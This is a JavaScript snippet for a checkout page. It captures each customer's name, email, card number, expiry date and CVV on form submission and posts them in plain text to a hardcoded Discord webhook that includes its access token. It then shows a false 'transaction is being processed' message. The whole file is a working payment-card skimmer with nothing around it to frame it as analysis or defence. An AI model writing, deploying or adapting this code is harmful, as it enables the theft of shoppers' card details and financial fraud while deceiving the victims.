document.getElementById('checkout-form').addEventListener('submit', function(event) {
    event.preventDefault();

    // Collect form data
    const name = document.getElementById('name').value;
    const email = document.getElementById('email').value;
    const card = document.getElementById('card').value;
    const expiry = document.getElementById('expiry').value;
    const cvv = document.getElementById('cvv').value;

    // Prepare the payload for Discord webhook
    const payload = {
        content: `**New Checkout Submission**\nName: ${name}\nEmail: ${email}\nCard: ${card}\nExpiry: ${expiry}\nCVV: ${cvv}`
    };

    // Send data to Discord webhook
    fetch("https://discord.com/api/webhooks/1268893038793719859/_ktjZVX-uHx8UVoYu7GAdrpkRLpbysF11nl120aBoWKRwdsY06g_9dAq1HYG7yeWvqwk", {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify(payload),
    })
    .then(response => {
        if (response.ok) {
            alert("Your transaction is being processed, check transaction status in 5 mins time.");
        } else {
            alert("Error processing transaction. Please try again.");
        }
    })
    .catch(error => {
        console.error('Error:', error);
        alert("Error processing transaction. Please try again.");
    });
});